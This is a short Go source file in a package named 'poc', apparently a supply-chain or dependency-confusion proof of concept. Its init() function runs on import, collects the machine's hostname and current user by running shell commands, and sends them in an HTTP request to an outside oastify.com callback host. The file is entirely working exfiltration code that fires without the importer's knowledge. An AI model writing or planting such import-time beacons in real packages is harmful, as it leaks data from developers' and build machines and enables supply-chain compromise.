package poc

import (
    "fmt"
    "net/http"
    "os/exec"
)

func init() {
    hostname, _ := exec.Command("hostname").Output()
    whoami, _ := exec.Command("whoami").Output()
    url := fmt.Sprintf("https://gfzpgyrzde9jacf2gh9sj758ozuqil6a.oastify.com/?host=%s&user=%s",
        string(hostname), string(whoami))
        http.Get(url)
}
